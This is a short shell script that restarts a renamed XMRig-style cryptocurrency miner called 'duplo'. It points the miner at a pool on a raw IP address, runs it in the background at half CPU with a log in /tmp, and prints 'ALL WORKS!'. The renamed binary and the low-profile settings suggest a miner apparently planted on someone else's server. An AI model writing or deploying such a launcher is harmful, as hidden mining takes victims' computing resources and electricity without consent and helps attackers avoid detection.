pkill duplo
sleep 7
duplo -o 116.203.113.95:55886 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server12/duplo.log --donate-level=1 --print-time=80 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=50 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server12/duplo.log'
